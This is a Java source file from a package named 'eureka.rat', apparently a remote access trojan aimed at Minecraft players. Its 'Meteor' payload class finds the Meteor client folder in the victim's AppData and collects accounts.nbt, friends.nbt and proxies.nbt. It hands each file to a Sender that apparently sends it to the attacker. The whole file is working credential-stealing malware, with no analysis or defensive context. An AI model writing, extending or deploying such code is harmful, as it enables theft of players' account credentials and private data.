package eureka.rat.features;

import eureka.rat.utils.Sender;
import eureka.rat.payloads.Payload;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;

public class Meteor implements Payload {
    private static final String[] IMPORTANT_FILES = new String[]{"accounts.nbt", "friends.nbt", "proxies.nbt"};

    @Override
    public void execute() throws Exception {
        Path path = Paths.get(System.getProperty("user.home") + "\\AppData\\Roaming\\.minecraft\\meteor-client");

        if (!Files.exists(path)) return;
        ArrayList<File> validFileDirs = new ArrayList<>();
        for (String fileName : IMPORTANT_FILES) {
            String dir = path + "\\" + fileName;
            if (!Files.exists(Paths.get(dir))) continue;

            validFileDirs.add(new File(dir));
        }

        validFileDirs.forEach(Sender::send);
    }
}
